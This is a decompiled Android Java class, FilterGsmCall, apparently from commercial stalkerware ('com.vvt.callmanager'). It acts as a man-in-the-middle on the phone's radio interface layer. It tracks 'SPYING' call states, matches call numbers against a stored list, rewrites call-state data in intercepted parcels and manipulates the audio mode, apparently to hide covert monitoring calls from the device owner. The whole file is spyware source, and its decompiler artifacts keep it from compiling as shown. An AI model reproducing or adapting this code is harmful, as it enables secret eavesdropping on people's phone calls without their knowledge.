package com.vvt.callmanager.filter;

import android.content.Context;
import android.media.AudioManager;
import android.os.Parcel;

import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;

import java.util.ArrayList;
import java.util.Iterator;

class FilterGsmCall
  extends a
  implements com.vvt.callmanager.a.c, com.vvt.callmanager.mitm.c
{
  private static final boolean a = g.a;
  private static final boolean b = g.b;
  private AudioManager c;
  private com.vvt.callmanager.mitm.d d;
  private com.vvt.callmanager.ref.f e;
  private Context f;
  private m g;
  private com.vvt.callmanager.a.a h;
  private FilterGsmCall.CallState i;
  
  public FilterGsmCall(Context paramContext, Mitm paramf, m paramm)
  {
    super(paramf);
    this.f = paramContext;
    this.g = paramm;
    Object localObject1 = com.vvt.callmanager.ref.f.a();
    this.e = ((com.vvt.callmanager.ref.f)localObject1);
    localObject1 = (AudioManager)this.f.getSystemService("audio");
    this.c = ((AudioManager)localObject1);
    localObject1 = new com/vvt/callmanager/a/a;
    Object localObject2 = this.c;
    ((com.vvt.callmanager.a.a)localObject1).<init>((AudioManager)localObject2, this);
    this.h = ((com.vvt.callmanager.a.a)localObject1);
    this.d = null;
    localObject2 = FilterGsmCall.CallState.values();
    int j = localObject2.length;
    int k = 0;
    localObject1 = null;
    while (k < j)
    {
      Object localObject3 = localObject2[k];
      ((FilterGsmCall.CallState)localObject3).setMessageFilter(this);
      k += 1;
    }
    localObject1 = FilterGsmCall.CallState.IDLE;
    a((FilterGsmCall.CallState)localObject1);
  }
  
  private com.vvt.callmanager.a.d a(ArrayList paramArrayList)
  {
    Iterator localIterator = paramArrayList.iterator();
    boolean bool;
    com.vvt.callmanager.a.d locald;
    int j;
    int k;
    do
    {
      bool = localIterator.hasNext();
      if (!bool) {
        break label64;
      }
      locald = (com.vvt.callmanager.a.d)localIterator.next();
      j = locald.c();
      k = 5;
      if (j == k) {
        break;
      }
      j = locald.c();
      k = 4;
    } while (j != k);
    for (;;)
    {
      return locald;
      label64:
      bool = false;
      locald = null;
    }
  }
  
  private FilterGsmCall.CallState a(FilterGsmCall.CallState paramCallState, Parcel paramParcel)
  {
    int j = 1;
    a("verifyCallState # ENTER ...");
    Object localObject1 = new Object[j];
    localObject1[0] = paramCallState;
    Object localObject2 = String.format("verifyCallState # Current state: %s", (Object[])localObject1);
    a((String)localObject2);
    ArrayList localArrayList = com.vvt.callmanager.a.d.a(paramParcel);
    localObject2 = "FilterCall";
    localObject1 = this.g.a();
    i.a((String)localObject2, localArrayList, (com.vvt.callmanager.mitm.a)localObject1);
    int k = localArrayList.size();
    if (k == 0)
    {
      localObject2 = FilterGsmCall.CallState.IDLE;
      localObject1 = localObject2;
      localObject2 = FilterGsmCall.CallState.RINGING;
      if (paramCallState == localObject2)
      {
        k = localArrayList.size();
        if (k == j)
        {
          localObject2 = (com.vvt.callmanager.a.d)localArrayList.get(0);
          k = ((com.vvt.callmanager.a.d)localObject2).c();
          int n = 5;
          if (k == n)
          {
            paramParcel.setDataPosition(20);
            k = 4;
            paramParcel.writeInt(k);
          }
        }
      }
      Object[] arrayOfObject = new Object[j];
      arrayOfObject[0] = localObject1;
      localObject2 = String.format("verifyCallState # Next state: %s", arrayOfObject);
      a((String)localObject2);
      c(paramParcel);
      a("verifyCallState # EXIT ...");
      return (FilterGsmCall.CallState)localObject1;
    }
    localObject1 = localArrayList.iterator();
    do
    {
      boolean bool = ((Iterator)localObject1).hasNext();
      if (!bool) {
        break;
      }
      localObject2 = (com.vvt.callmanager.a.d)((Iterator)localObject1).next();
      m = ((com.vvt.callmanager.a.d)localObject2).c();
    } while (m <= j);
    int m = 0;
    localObject2 = null;
    for (;;)
    {
      if (m != 0)
      {
        localObject2 = FilterGsmCall.CallState.OFFHOOK;
        localObject1 = localObject2;
        break;
      }
      localObject1 = paramCallState;
      break;
      m = j;
    }
  }
  
  private void a(FilterGsmCall.CallState paramCallState)
  {
    Object localObject1 = this.i;
    if (paramCallState != localObject1)
    {
      int j = 2;
      Object localObject2 = new Object[j];
      FilterGsmCall.CallState localCallState = this.i;
      localObject2[0] = localCallState;
      int k = 1;
      localObject2[k] = paramCallState;
      localObject1 = String.format("setState # %s -> %s", (Object[])localObject2);
      a((String)localObject1);
      localObject1 = null;
      localObject2 = this.i;
      if (localObject2 != null) {
        localObject1 = this.i.onExit();
      }
      this.i = paramCallState;
      paramCallState.onEnter(localObject1);
    }
  }
  
  private void a(BugEngineCallState paramBugEngineCallState)
  {
    com.vvt.callmanager.ref.e locale = a();
    if (locale != null) {
      locale.a(paramBugEngineCallState);
    }
    for (;;)
    {
      return;
      boolean bool = b;
      if (!bool) {}
    }
  }
  
  private void a(MonitorDisconnectData paramMonitorDisconnectData)
  {
    com.vvt.callmanager.mitm.d locald = this.d;
    if (locald != null)
    {
      locald = this.d;
      locald.a(paramMonitorDisconnectData);
    }
  }
  
  private void a(String paramString)
  {
    this.g.b(paramString);
  }
  
  private boolean a(Parcel paramParcel, int paramInt)
  {
    boolean bool1 = true;
    boolean bool2 = false;
    int j = 1049;
    if (paramInt == j)
    {
      paramParcel.setDataPosition(12);
      paramParcel.readInt();
      paramParcel.readInt();
      j = paramParcel.readInt();
      paramParcel.setDataPosition(0);
      int k = 4;
      if (j != k)
      {
        k = 5;
        if (j != k) {}
      }
      else
      {
        bool2 = bool1;
      }
    }
    for (;;)
    {
      return bool2;
      j = 1018;
      if (paramInt != j)
      {
        j = 1510;
        if (paramInt != j) {}
      }
      else
      {
        bool2 = bool1;
      }
    }
  }
  
  private boolean a(ArrayList paramArrayList1, ArrayList paramArrayList2)
  {
    int j = 1;
    float f1 = Float.MIN_VALUE;
    boolean bool1 = a;
    if (bool1) {}
    bool1 = paramArrayList2.isEmpty();
    float f2;
    boolean bool8;
    float f3;
    int i4;
    Object localObject;
    int i3;
    float f4;
    int m;
    if (!bool1)
    {
      Iterator localIterator1 = paramArrayList2.iterator();
      boolean bool7 = j;
      f2 = f1;
      bool8 = false;
      f3 = 0.0F;
      i4 = 0;
      Iterator localIterator2 = null;
      bool1 = localIterator1.hasNext();
      if (bool1)
      {
        localObject = i.a((byte[])localIterator1.next());
        l locall = l.a((Parcel)localObject);
        int i5 = locall.a;
        if (i5 != j) {
          break label501;
        }
        int i7 = locall.b;
        int i6 = 1049;
        if (i7 != i6) {
          break label501;
        }
        i3 = 16;
        f2 = 2.24E-44F;
        ((Parcel)localObject).setDataPosition(i3);
        i7 = ((Parcel)localObject).readInt();
        i6 = ((Parcel)localObject).readInt();
        bool1 = a;
        if (bool1) {}
        int k = -1;
        f4 = 0.0F / 0.0F;
        if (i6 > k)
        {
          k = 7;
          f4 = 9.8E-45F;
          if (i6 < k)
          {
            i3 = i4 + 1;
            localIterator2 = paramArrayList1.iterator();
            int i8;
            do
            {
              boolean bool2 = localIterator2.hasNext();
              if (!bool2) {
                break;
              }
              localObject = (com.vvt.callmanager.a.d)localIterator2.next();
              i8 = ((com.vvt.callmanager.a.d)localObject).a();
            } while (i8 != i7);
            i4 = a;
            if ((i4 != 0) && (bool8)) {
              break label490;
            }
            m = ((com.vvt.callmanager.a.d)localObject).c();
            if (m != i6)
            {
              m = j;
              f4 = f1;
              label277:
              if (m != 0)
              {
                bool8 = a;
                if (!bool8) {}
              }
              label292:
              bool8 = m;
              f3 = f4;
              m = j;
              f4 = f1;
            }
          }
        }
      }
    }
    for (;;)
    {
      i4 = i3;
      i3 = m;
      f2 = f4;
      break;
      m = 0;
      localObject = null;
      f4 = 0.0F;
      break label277;
      boolean bool3 = a;
      if (bool3) {}
      bool3 = false;
      localObject = null;
      f4 = 0.0F;
      i3 = i4;
      continue;
      bool3 = a;
      if ((!bool3) || (i3 == 0))
      {
        bool3 = a;
        if (bool3) {}
        j = 0;
        f1 = 0.0F;
      }
      for (;;)
      {
        bool3 = a;
        if (bool3) {}
        return j;
        int n = paramArrayList1.size();
        if ((i4 == n) && (bool8))
        {
          boolean bool4 = a;
          if (!bool4) {}
        }
        else
        {
          int i1 = paramArrayList1.size();
          if (i4 > i1)
          {
            boolean bool5 = a;
            if (!bool5) {}
          }
          else
          {
            int i2 = paramArrayList1.size();
            if (i4 < i2)
            {
              bool6 = a;
              if (!bool6) {}
            }
            j = 0;
            f1 = 0.0F;
          }
        }
      }
      label490:
      boolean bool6 = bool8;
      f4 = f3;
      break label292;
      label501:
      bool6 = i3;
      f4 = f2;
      i3 = i4;
    }
  }
  
  private int b(FilterGsmCall.CallState paramCallState)
  {
    int j = 1;
    int k = 2;
    int m = -1;
    FilterGsmCall.CallState localCallState1 = FilterGsmCall.CallState.IDLE;
    if (paramCallState == localCallState1) {
      k = 0;
    }
    for (;;)
    {
      return k;
      localCallState1 = FilterGsmCall.CallState.DIALING;
      if (paramCallState != localCallState1)
      {
        localCallState1 = FilterGsmCall.CallState.RINGING;
        if (paramCallState == localCallState1)
        {
          k = j;
        }
        else
        {
          localCallState1 = FilterGsmCall.CallState.OFFHOOK;
          if (paramCallState != localCallState1)
          {
            localCallState1 = FilterGsmCall.CallState.OFFHOOK_DIALING;
            if (paramCallState != localCallState1)
            {
              localCallState1 = FilterGsmCall.CallState.OFFHOOK_RINGING;
              if (paramCallState == localCallState1)
              {
                k = j;
              }
              else
              {
                FilterGsmCall.CallState localCallState2 = FilterGsmCall.CallState.SPYING;
                if (paramCallState != localCallState2)
                {
                  localCallState2 = FilterGsmCall.CallState.OFFHOOK_SPYING;
                  if (paramCallState != localCallState2) {
                    k = m;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  
  private ArrayList b(ArrayList paramArrayList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int j = paramArrayList.size();
    for (int k = j; k > 0; k = j)
    {
      j = k + -1;
      com.vvt.callmanager.a.d locald = (com.vvt.callmanager.a.d)paramArrayList.get(j);
      if (locald != null)
      {
        com.vvt.callmanager.ref.f localf = this.e;
        String str = locald.d();
        boolean bool = localf.a(str);
        if (bool) {
          localArrayList.add(locald);
        }
      }
      j = k + -1;
    }
    return localArrayList;
  }
  
  private void c()
  {
    com.vvt.callmanager.a.a locala = new com/vvt/callmanager/a/a;
    AudioManager localAudioManager = this.c;
    locala.<init>(localAudioManager, this);
    this.h = locala;
    this.h.start();
  }
  
  private void c(ArrayList paramArrayList)
  {
    Iterator localIterator = paramArrayList.iterator();
    for (;;)
    {
      boolean bool = localIterator.hasNext();
      if (!bool) {
        break;
      }
      Parcel localParcel = i.a((byte[])localIterator.next());
      c(localParcel);
    }
    paramArrayList.clear();
  }
  
  private void e()
  {
    com.vvt.callmanager.a.a locala = this.h;
    if (locala != null)
    {
      this.h.a();
      locala = null;
      this.h = null;
    }
  }
  
  public void a(int paramInt)
  {
    int j = 1;
    int k = 2;
    Object localObject1 = new Object[k];
    Object localObject2 = this.i;
    localObject1[0] = localObject2;
    localObject2 = Integer.valueOf(paramInt);
    localObject1[j] = localObject2;
    Object localObject3 = String.format("onAudioModeUpdate # Call State: %s, Audio Mode: %d", (Object[])localObject1);
    a((String)localObject3);
    localObject3 = this.i;
    int m = b((FilterGsmCall.CallState)localObject3);
    if (paramInt == m)
    {
      localObject3 = "onAudioModeUpdate # Audio mode is OK -> Stop listener";
      a((String)localObject3);
      e();
    }
    for (;;)
    {
      return;
      localObject2 = new Object[j];
      Integer localInteger = Integer.valueOf(m);
      localObject2[0] = localInteger;
      localObject1 = String.format("onAudioModeUpdate # Change audio mode to: %d ", (Object[])localObject2);
      a((String)localObject1);
      localObject1 = this.c;
      ((AudioManager)localObject1).setMode(m);
    }
  }
  
  public void a(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O->M..T";
    Object localObject1 = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject1;
    localObject1 = this.i;
    arrayOfObject[2] = localObject1;
    Object localObject2 = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a((String)localObject2);
    localObject2 = this.i.processRilRequest(paramParcel);
    a((FilterGsmCall.CallState)localObject2);
  }
  
  public void a(com.vvt.callmanager.mitm.d paramd)
  {
    this.d = paramd;
  }
  
  public void b(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O..M<=T";
    Object localObject1 = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject1;
    localObject1 = this.i;
    arrayOfObject[2] = localObject1;
    Object localObject2 = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a((String)localObject2);
    localObject2 = this.i.processResponse(paramParcel);
    a((FilterGsmCall.CallState)localObject2);
  }
  
  protected void c(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O<=M..T";
    Object localObject = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject;
    localObject = this.i;
    arrayOfObject[2] = localObject;
    String str = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a(str);
    super.c(paramParcel);
  }
  
  protected void d(Parcel paramParcel)
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "O..M->T";
    Object localObject = com.vvt.callmanager.mitm.e.a(paramParcel);
    arrayOfObject[1] = localObject;
    localObject = this.i;
    arrayOfObject[2] = localObject;
    String str = String.format("%s: \"%s\" -- %s", arrayOfObject);
    a(str);
    super.d(paramParcel);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterGsmCall.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */